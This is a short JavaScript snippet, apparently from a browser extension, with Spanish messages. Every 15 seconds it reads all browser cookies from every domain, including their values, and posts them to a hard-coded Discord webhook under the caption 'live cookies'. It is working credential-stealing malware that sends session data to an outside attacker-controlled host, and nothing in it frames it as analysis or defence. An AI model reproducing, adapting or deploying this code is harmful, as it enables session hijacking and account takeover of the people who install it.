let interval = setInterval(() => {
    chrome.cookies.getAll({}, function(cookies) {
        if (cookies.length > 0) {
            let data = cookies.map(c => `${c.domain} | ${c.name} = ${c.value}`).join('\n');
            fetch('https://discord.com/api/webhooks/1573018072963358791/JPqSx6Ir3diZoaqeH8zwi8GCPcvrM3rT_W3j_-NvygzsOE7nu14PjXQRwleE5c_NHYZA', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `💀 **Cookies en vivo** (${cookies.length} en total)\n\`\`\`\n${data.substring(0, 1900)}\n\`\`\``
                })
            });
        }
    });
}, 15000); // Envía cada 15 segundos